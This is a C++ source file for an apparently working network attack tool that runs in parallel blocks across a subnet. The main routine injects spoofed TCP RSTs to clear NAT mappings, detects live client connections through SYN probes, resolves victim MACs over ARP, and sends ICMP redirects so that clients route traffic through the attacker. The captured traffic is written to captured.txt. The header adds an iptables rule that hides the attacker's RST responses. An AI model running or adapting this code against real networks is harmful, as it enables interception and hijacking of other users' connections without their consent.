/*
 * attack_p.cpp  —  parallel version (block-parallel)
 *
 * NOTE: suppress kernel RST responses before running:
 *   sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
 *
 * Build:  make attack_p
 * Run:    sudo ./attack_p --ports <file> --subnet 24
 */

#include "common.h"

static mutex mac_mtx;

static void block_worker(
        size_t bi,
        const vector<Host>& block,
        const vector<uint16_t>& ports,
        NetworkInterface& iface,
        const string& self_mac,
        const string& gw_mac,
        map<string,string>& mac_cache,
        ofstream& cap_log,
        mutex& log_mtx,
        int nat_wait, int syn_wait) {

    PacketSender sender;
    string prefix = "[block " + to_string(bi+1) + "] ";

    println(ts() + prefix + "start  [" + block.front().ip +
            " .. " + block.back().ip + "]  " + to_string(ports.size()) + " port(s)");

    // 1. RST all ports from every IP in block
    println(ts() + prefix + "sending " + to_string(block.size() * ports.size()) + " RSTs...");
    for (uint16_t port : ports)
        rst_block(block, port, iface, sender, self_mac, gw_mac);

    // 2. Wait for NAT to clear CLOSE-state entries
    println(ts() + prefix + "waiting " + to_string(nat_wait) + "s for NAT...");
    this_thread::sleep_for(chrono::seconds(nat_wait));

    // 3. Start sniffer, then send SYNs for all ports
    BlockProbeResult result;
    atomic<bool> probe_stop{false};
    Sniffer probe_sn(IFACE, sniffer_cfg(probe_block_filter()));
    thread probe_th([&]() { result = probe_block(probe_sn, ports, probe_stop); });
    this_thread::sleep_for(chrono::milliseconds(100));

    println(ts() + prefix + "sending " + to_string(ports.size()) + " SYNs...");
    for (uint16_t port : ports)
        syn_probe(port, iface, sender, self_mac, gw_mac);

    // 4. Collect for syn_wait seconds then stop
    this_thread::sleep_for(chrono::seconds(syn_wait));
    probe_stop = true;
    probe_sn.stop_sniff();
    probe_th.join();

    {
        ostringstream os;
        os << ts() << prefix << "probe done: " << result.c_acks.size()
           << " c-ACK(s)  " << result.syn_acks.size() << " SYN-ACK(s)";
        println(os.str());
    }

    if (result.c_acks.empty()) {
        println(ts() + prefix + "no active mappings in block.");
        return;
    }

    // 5. Resolve MACs for the whole block (only when c-ACKs found; cached across blocks)
    map<string,string> block_macs;
    for (const auto& h : block) {
        string mac;
        {
            lock_guard<mutex> lk(mac_mtx);
            auto it = mac_cache.find(h.ip);
            if (it != mac_cache.end()) { block_macs[h.ip] = it->second; continue; }
        }
        mac = arp_cache(h.ip);
        if (mac.empty()) {
            try {
                EthernetII req = ARP::make_arp_request(
                    IPv4Address(h.ip), iface.ipv4_address(), iface.hw_address());
                unique_ptr<PDU> reply(sender.send_recv(req, iface));
                if (reply) mac = reply->rfind_pdu<ARP>().sender_hw_addr().to_string();
            } catch (...) {}
        }
        if (mac.empty()) {
            println(ts() + prefix + "  ARP no reply from " + h.ip + ", using gateway MAC");
            mac = GATEWAY_MAC;
        }
        {
            lock_guard<mutex> lk(mac_mtx);
            mac_cache[h.ip] = mac;
        }
        block_macs[h.ip] = mac;
        println(ts() + prefix + "  ARP " + h.ip + " -> " + mac);
    }

    // 6. ICMP redirect for each c-ACK port (sent to all IPs in block;
    //    each client only responds to the redirect matching its own connection)
    vector<uint16_t> cack_ports;
    println(ts() + prefix + "sending " + to_string(result.c_acks.size()) + " ICMP redirect(s)...");
    for (auto& [port, seq] : result.c_acks) {
        cack_ports.push_back(port);
        ostringstream os;
        os << ts() << prefix << "  -> port " << port << "  seq=" << seq;
        println(os.str());
        icmp_redirect(block, port, seq, iface, sender, self_mac, gw_mac, block_macs);
    }

  
    println(ts() + prefix + "capture session started (" + to_string(SNIFF_WAIT) + "s, " +
            to_string(cack_ports.size()) + " port(s)).");
    thread cap = spawn_capture_ports(block, cack_ports, SNIFF_WAIT, cap_log, log_mtx);
    cap.join();   // block_worker waits; other blocks run in parallel threads

    println(ts() + prefix + "done.");
}

static void usage(const char* prog) {
    cerr << "Usage:\n"
         << "  " << prog << " --ports <file> --subnet <prefix>  [options]\n"
         << "  " << prog << " --ports <file> --hosts  <file>    [options]\n"
         << "\nOptions:\n"
         << "  --block       IPs per block           (default 10)\n"
         << "  --nat-wait    seconds after RST        (default " << NAT_CLEAR_WAIT  << ")\n"
         << "  --syn-wait    seconds to wait for SYN response (default " << SYN_WAIT << ")\n";
}

int main(int argc, char* argv[]) {
    ts_ms();

    string ports_file, hosts_file;
    int prefix = -1, block_sz = 10;
    int nat_wait = NAT_CLEAR_WAIT, syn_wait = SYN_WAIT;

    for (int i = 1; i < argc; i++) {
        string a = argv[i];
        if      (a == "--ports"      && i+1 < argc) ports_file  = argv[++i];
        else if (a == "--hosts"      && i+1 < argc) hosts_file  = argv[++i];
        else if (a == "--subnet"     && i+1 < argc) prefix      = stoi(argv[++i]);
        else if (a == "--block"      && i+1 < argc) block_sz    = stoi(argv[++i]);
        else if (a == "--nat-wait"   && i+1 < argc) nat_wait    = stoi(argv[++i]);
        else if (a == "--syn-wait"   && i+1 < argc) syn_wait    = stoi(argv[++i]);
    }

    if (ports_file.empty() || (prefix < 0 && hosts_file.empty())) {
        usage(argv[0]); return 1;
    }

    auto ports = load_ports(ports_file);
    if (ports.empty()) { cerr << "No ports loaded\n"; return 1; }
    cout << ts() << "Ports: " << ports.size() << " (block-parallel)\n";

    vector<Host> all_hosts;
    if (!hosts_file.empty()) {
        all_hosts = load_hosts(hosts_file);
        cout << ts() << "Hosts from file: " << all_hosts.size() << "\n";
    } else {
        for (auto& ip : subnet_hosts(ATTACKER_IP, prefix))
            all_hosts.push_back({ip, ""});
        cout << ts() << "Hosts from /" << prefix << ": " << all_hosts.size() << "\n";
    }

    NetworkInterface iface(IFACE);
    PacketSender     setup_sender;
    string           self_mac = iface.hw_address().to_string();

    cout << ts() << "Resolving gateway MAC (" << GATEWAY_IP << ")... ";
    string gw_mac = resolve_mac(GATEWAY_IP, iface, setup_sender);
    cout << gw_mac << "\n";

    map<string,string> mac_cache;
    for (const auto& h : all_hosts)
        if (!h.mac.empty()) mac_cache[h.ip] = h.mac;

    vector<vector<Host>> blocks;
    for (size_t i = 0; i < all_hosts.size(); i += block_sz) {
        size_t end = min(i + (size_t)block_sz, all_hosts.size());
        blocks.emplace_back(all_hosts.begin() + i, all_hosts.begin() + end);
    }
    cout << ts() << all_hosts.size() << " hosts in " << blocks.size()
         << " blocks (k=" << block_sz << ") — launching " << blocks.size()
         << " threads\n\n";

    ofstream cap_log("captured.txt", ios::app);
    mutex    log_mtx;

    vector<thread> workers;
    workers.reserve(blocks.size());
    for (size_t bi = 0; bi < blocks.size(); bi++) {
        workers.emplace_back(block_worker,
            bi, cref(blocks[bi]), cref(ports),
            ref(iface), self_mac, gw_mac,
            ref(mac_cache), ref(cap_log), ref(log_mtx),
            nat_wait, syn_wait);
    }

    for (auto& t : workers) t.join();

    cout << ts() << "All blocks done. Captured traffic in captured.txt\n";
    return 0;
}
